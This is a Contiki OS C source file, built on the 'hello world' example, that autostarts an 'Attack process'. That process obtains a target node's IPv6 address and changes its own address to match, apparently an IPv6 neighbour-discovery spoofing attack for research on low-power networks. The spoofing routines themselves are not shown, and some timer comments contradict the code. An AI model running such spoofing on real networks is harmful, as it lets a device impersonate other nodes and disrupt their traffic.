/*
 * Copyright (c) 2006, Swedish Institute of Computer Science.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. Neither the name of the Institute nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE INSTITUTE AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE INSTITUTE OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 * This file is part of the Contiki operating system.
 *
 */

/**
 * \file
 *         A very simple Contiki application showing how Contiki programs look
 * \author
 *         Adam Dunkels <adam@sics.se>
 */

#include "contiki.h"

#include <stdio.h> /* For printf() */
#include "net/ipv6/uip.h"
#include "dev/uip-nd6-att.h"

/*---------------------------------------------------------------------------*/

PROCESS(hello_world_process, "Hello world process");
PROCESS(attack_process, "Attack process");

AUTOSTART_PROCESSES(&hello_world_process, &attack_process);

#define RA_SEND_INTERVAL		  (3 * CLOCK_SECOND)

attack_target_t attack_target;

/*---------------------------------------------------------------------------*/
PROCESS_THREAD(hello_world_process, ev, data)
{
  static struct etimer timer;

  PROCESS_BEGIN();

  /* Setup a periodic timer that expires after 10 seconds. */
  etimer_set(&timer, CLOCK_SECOND * 50);

  while(1) {
    printf("Hello, world\n");

    /* Wait for the periodic timer to expire and then restart the timer. */
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));
    etimer_reset(&timer);
  }

  PROCESS_END();
}

PROCESS_THREAD(attack_process, ev, data)
{
  static struct etimer timer;
  static struct etimer spoof_addr_timer;
  // static struct etimer periodic_timer;
  // static unsigned count;
  // static char str[32];
  // uip_ipaddr_t dest_ipaddr;
  static bool got_spoof_addr;

  PROCESS_BEGIN();
  etimer_set(&spoof_addr_timer, CLOCK_SECOND * 2);
  uip_nd6_att_init();

  attack_target = get_attack_target();

  while (!got_spoof_addr)
  {
    
    // uip_nd6_ra_output()
    printf("tried to get spoof address \n");
    if(!uip_is_addr_unspecified(&attack_target.ipaddr)){
      got_spoof_addr = true;
      printf("Got address...");
      print_attk_tgt_addr();
    }
    else
    {
      PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&spoof_addr_timer));
      etimer_reset(&spoof_addr_timer);
    }
  }

  if(got_spoof_addr){
    change_attack_node_address();
  }

  /* Setup a periodic timer that expires after 10 seconds. */
  etimer_set(&timer, CLOCK_SECOND * 50);

  while(1) {
    printf("Hello, world\n");

    /* Wait for the periodic timer to expire and then restart the timer. */
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));
    etimer_reset(&timer);
  }

  PROCESS_END();
}
/*---------------------------------------------------------------------------*/
